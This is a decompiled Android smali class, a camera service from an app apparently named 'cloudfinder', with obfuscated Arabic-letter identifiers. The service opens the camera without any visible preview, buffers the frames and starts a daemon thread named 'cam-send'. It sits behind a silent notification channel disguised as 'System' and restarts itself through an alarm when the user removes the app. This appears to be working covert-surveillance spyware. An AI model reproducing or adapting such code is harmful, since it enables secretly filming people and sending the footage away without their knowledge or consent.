.class public Lcom/lite/cloudfinder/service/CameraService;
.super Landroid/app/Service;
.source "SourceFile"

# interfaces
.implements Landroid/view/SurfaceHolder$Callback;
.implements Landroid/hardware/Camera$PreviewCallback;


# static fields
.field public static final ب:Ljava/lang/Object;

.field public static volatile ة:Z = false

.field public static ت:Lcom/lite/cloudfinder/service/CameraService;


# instance fields
.field public ؋:Landroid/hardware/Camera;

.field public ؠ:I

.field public ء:I

.field public volatile آ:Z

.field public أ:Landroid/graphics/SurfaceTexture;

.field public final ؤ:Ljava/util/ArrayList;

.field public إ:I

.field public ئ:I

.field public ا:Ljava/lang/Thread;


# direct methods
.method public static constructor <clinit>()V
    .locals 1

    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcom/lite/cloudfinder/service/CameraService;->ب:Ljava/lang/Object;

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    iput v0, p0, Lcom/lite/cloudfinder/service/CameraService;->ؠ:I

    const/16 v1, 0x32

    iput v1, p0, Lcom/lite/cloudfinder/service/CameraService;->ء:I

    iput-boolean v0, p0, Lcom/lite/cloudfinder/service/CameraService;->آ:Z

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/lite/cloudfinder/service/CameraService;->ؤ:Ljava/util/ArrayList;

    return-void
.end method


# virtual methods
.method public final onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public final onCreate()V
    .locals 4

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    sput-object p0, Lcom/lite/cloudfinder/service/CameraService;->ت:Lcom/lite/cloudfinder/service/CameraService;

    const/4 v0, 0x1

    sput-boolean v0, Lcom/lite/cloudfinder/service/CameraService;->ة:Z

    new-instance v0, Landroid/app/NotificationChannel;

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v1

    const-string v2, "es"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    const-string v1, "Sistema"

    goto :goto_0

    :cond_0
    const-string v1, "System"

    :goto_0
    const-string v2, "cam_channel"

    const/4 v3, 0x0

    invoke-direct {v0, v2, v1, v3}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    invoke-virtual {v0, v3}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    const/4 v1, -0x1

    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setLockscreenVisibility(I)V

    invoke-virtual {v0, v3}, Landroid/app/NotificationChannel;->enableLights(Z)V

    invoke-virtual {v0, v3}, Landroid/app/NotificationChannel;->enableVibration(Z)V

    const/4 v1, 0x0

    invoke-virtual {v0, v1, v1}, Landroid/app/NotificationChannel;->setSound(Landroid/net/Uri;Landroid/media/AudioAttributes;)V

    const-class v1, Landroid/app/NotificationManager;

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    if-eqz v1, :cond_1

    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    :cond_1
    return-void
.end method

.method public final onDestroy()V
    .locals 1

    const/4 v0, 0x0

    sput-boolean v0, Lcom/lite/cloudfinder/service/CameraService;->ة:Z

    invoke-virtual {p0}, Lcom/lite/cloudfinder/service/CameraService;->؋()V

    const/4 v0, 0x0

    sput-object v0, Lcom/lite/cloudfinder/service/CameraService;->ت:Lcom/lite/cloudfinder/service/CameraService;

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public final onPreviewFrame([BLandroid/hardware/Camera;)V
    .locals 2

    if-eqz p1, :cond_2

    iget-boolean p2, p0, Lcom/lite/cloudfinder/service/CameraService;->آ:Z

    if-nez p2, :cond_0

    goto :goto_0

    :cond_0
    sget-object p2, Lcom/lite/cloudfinder/service/CameraService;->ب:Ljava/lang/Object;

    monitor-enter p2

    :try_start_0
    iget-object v0, p0, Lcom/lite/cloudfinder/service/CameraService;->ؤ:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v0

    const/4 v1, 0x3

    if-ge v0, v1, :cond_1

    iget-object v0, p0, Lcom/lite/cloudfinder/service/CameraService;->ؤ:Ljava/util/ArrayList;

    invoke-virtual {v0, p1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_1
    monitor-exit p2

    return-void

    :catchall_0
    move-exception p1

    monitor-exit p2
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    throw p1

    :cond_2
    :goto_0
    return-void
.end method

.method public final onStartCommand(Landroid/content/Intent;II)I
    .locals 6

    const/4 p2, 0x1

    if-eqz p1, :cond_7

    const-string p3, "index"

    const/4 v0, 0x0

    invoke-virtual {p1, p3, v0}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p3

    iput p3, p0, Lcom/lite/cloudfinder/service/CameraService;->ؠ:I

    const-string p3, "quality"

    const/16 v1, 0x32

    invoke-virtual {p1, p3, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p1

    iput p1, p0, Lcom/lite/cloudfinder/service/CameraService;->ء:I

    const-string p1, "continuous-video"

    const-string p3, "CameraService"

    :try_start_0
    iget-object v1, p0, Lcom/lite/cloudfinder/service/CameraService;->؋:Landroid/hardware/Camera;

    if-eqz v1, :cond_0

    invoke-virtual {p0}, Lcom/lite/cloudfinder/service/CameraService;->؋()V

    :cond_0
    iget v1, p0, Lcom/lite/cloudfinder/service/CameraService;->ؠ:I

    invoke-static {v1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v1

    iput-object v1, p0, Lcom/lite/cloudfinder/service/CameraService;->؋:Landroid/hardware/Camera;

    invoke-virtual {v1}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v1

    const/16 v2, 0x11

    invoke-virtual {v1, v2}, Landroid/hardware/Camera$Parameters;->setPreviewFormat(I)V

    invoke-virtual {v1}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v2

    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_1
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_2

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/hardware/Camera$Size;

    iget v4, v3, Landroid/hardware/Camera$Size;->width:I

    const/16 v5, 0x258

    if-le v4, v5, :cond_1

    iget v4, v3, Landroid/hardware/Camera$Size;->height:I

    const/16 v5, 0x190

    if-le v4, v5, :cond_1

    goto :goto_0

    :cond_2
    const/4 v3, 0x0

    :goto_0
    if-nez v3, :cond_3

    invoke-virtual {v1}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v2

    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_3

    invoke-interface {v2, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    move-object v3, v2

    check-cast v3, Landroid/hardware/Camera$Size;

    :cond_3
    if-eqz v3, :cond_4

    iget v2, v3, Landroid/hardware/Camera$Size;->width:I

    iget v4, v3, Landroid/hardware/Camera$Size;->height:I

    invoke-virtual {v1, v2, v4}, Landroid/hardware/Camera$Parameters;->setPreviewSize(II)V

    iget v2, v3, Landroid/hardware/Camera$Size;->width:I

    iput v2, p0, Lcom/lite/cloudfinder/service/CameraService;->إ:I

    iget v2, v3, Landroid/hardware/Camera$Size;->height:I

    iput v2, p0, Lcom/lite/cloudfinder/service/CameraService;->ئ:I

    :cond_4
    invoke-virtual {v1}, Landroid/hardware/Camera$Parameters;->getSupportedFocusModes()Ljava/util/List;

    move-result-object v2

    if-eqz v2, :cond_5

    invoke-interface {v2, p1}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_5

    invoke-virtual {v1, p1}, Landroid/hardware/Camera$Parameters;->setFocusMode(Ljava/lang/String;)V

    :cond_5
    iget-object p1, p0, Lcom/lite/cloudfinder/service/CameraService;->؋:Landroid/hardware/Camera;

    invoke-virtual {p1, v1}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    new-instance p1, Landroid/graphics/SurfaceTexture;

    invoke-direct {p1, v0}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    iput-object p1, p0, Lcom/lite/cloudfinder/service/CameraService;->أ:Landroid/graphics/SurfaceTexture;

    iget-object v0, p0, Lcom/lite/cloudfinder/service/CameraService;->؋:Landroid/hardware/Camera;

    invoke-virtual {v0, p1}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V

    iget-object p1, p0, Lcom/lite/cloudfinder/service/CameraService;->؋:Landroid/hardware/Camera;

    invoke-virtual {p1, p0}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    iget-object p1, p0, Lcom/lite/cloudfinder/service/CameraService;->؋:Landroid/hardware/Camera;

    invoke-virtual {p1}, Landroid/hardware/Camera;->startPreview()V

    iput-boolean p2, p0, Lcom/lite/cloudfinder/service/CameraService;->آ:Z

    iget-object p1, p0, Lcom/lite/cloudfinder/service/CameraService;->ا:Ljava/lang/Thread;

    if-eqz p1, :cond_6

    invoke-virtual {p1}, Ljava/lang/Thread;->isAlive()Z

    move-result p1

    if-eqz p1, :cond_6

    iget-object p1, p0, Lcom/lite/cloudfinder/service/CameraService;->ا:Ljava/lang/Thread;

    invoke-virtual {p1}, Ljava/lang/Thread;->interrupt()V

    :cond_6
    new-instance p1, Ljava/lang/Thread;

    new-instance v0, Landroidx/constraintlayout/helper/widget/؋;

    const/16 v1, 0x1a

    invoke-direct {v0, v1, p0}, Landroidx/constraintlayout/helper/widget/؋;-><init>(ILjava/lang/Object;)V

    const-string v1, "cam-send"

    invoke-direct {p1, v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object p1, p0, Lcom/lite/cloudfinder/service/CameraService;->ا:Ljava/lang/Thread;

    invoke-virtual {p1, p2}, Ljava/lang/Thread;->setDaemon(Z)V

    iget-object p1, p0, Lcom/lite/cloudfinder/service/CameraService;->ا:Ljava/lang/Thread;

    invoke-virtual {p1}, Ljava/lang/Thread;->start()V

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "Camera started: index="

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v0, p0, Lcom/lite/cloudfinder/service/CameraService;->ؠ:I

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, " size="

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v0, p0, Lcom/lite/cloudfinder/service/CameraService;->إ:I

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, "x"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v0, p0, Lcom/lite/cloudfinder/service/CameraService;->ئ:I

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p3, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    const-string v0, "startCamera error"

    invoke-static {p3, v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    invoke-virtual {p0}, Lcom/lite/cloudfinder/service/CameraService;->؋()V

    :cond_7
    :goto_1
    return p2
.end method

.method public final onTaskRemoved(Landroid/content/Intent;)V
    .locals 6

    :try_start_0
    const-string v0, "alarm"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    if-eqz v0, :cond_1

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/lite/cloudfinder/service/CameraService;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1f

    if-lt v2, v3, :cond_0

    const/high16 v2, 0x42000000    # 32.0f

    goto :goto_0

    :cond_0
    const/high16 v2, 0x40000000    # 2.0f

    :goto_0
    const/4 v3, 0x6

    invoke-static {p0, v3, v1, v2}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v2

    const-wide/16 v4, 0x3e8

    add-long/2addr v2, v4

    const/4 v4, 0x2

    invoke-virtual {v0, v4, v2, v3, v1}, Landroid/app/AlarmManager;->setExactAndAllowWhileIdle(IJLandroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    return-void
.end method

.method public final surfaceChanged(Landroid/view/SurfaceHolder;III)V
    .locals 0

    return-void
.end method

.method public final surfaceCreated(Landroid/view/SurfaceHolder;)V
    .locals 0

    return-void
.end method

.method public final surfaceDestroyed(Landroid/view/SurfaceHolder;)V
    .locals 0

    return-void
.end method

.method public final ؋()V
    .locals 3

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/lite/cloudfinder/service/CameraService;->آ:Z

    iget-object v0, p0, Lcom/lite/cloudfinder/service/CameraService;->ا:Ljava/lang/Thread;

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    iput-object v1, p0, Lcom/lite/cloudfinder/service/CameraService;->ا:Ljava/lang/Thread;

    :cond_0
    :try_start_0
    iget-object v0, p0, Lcom/lite/cloudfinder/service/CameraService;->؋:Landroid/hardware/Camera;

    if-eqz v0, :cond_1

    invoke-virtual {v0, v1}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    iget-object v0, p0, Lcom/lite/cloudfinder/service/CameraService;->؋:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V

    iget-object v0, p0, Lcom/lite/cloudfinder/service/CameraService;->؋:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    iput-object v1, p0, Lcom/lite/cloudfinder/service/CameraService;->؋:Landroid/hardware/Camera;

    :cond_1
    iget-object v0, p0, Lcom/lite/cloudfinder/service/CameraService;->أ:Landroid/graphics/SurfaceTexture;

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Landroid/graphics/SurfaceTexture;->release()V

    iput-object v1, p0, Lcom/lite/cloudfinder/service/CameraService;->أ:Landroid/graphics/SurfaceTexture;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "CameraService"

    const-string v2, "stopCamera error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_2
    :goto_0
    sget-object v0, Lcom/lite/cloudfinder/service/CameraService;->ب:Ljava/lang/Object;

    monitor-enter v0

    :try_start_1
    iget-object v1, p0, Lcom/lite/cloudfinder/service/CameraService;->ؤ:Ljava/util/ArrayList;

    invoke-virtual {v1}, Ljava/util/ArrayList;->clear()V

    monitor-exit v0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    const-string v0, "CameraService"

    const-string v1, "Camera stopped"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :catchall_0
    move-exception v1

    :try_start_2
    monitor-exit v0
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    throw v1
.end method
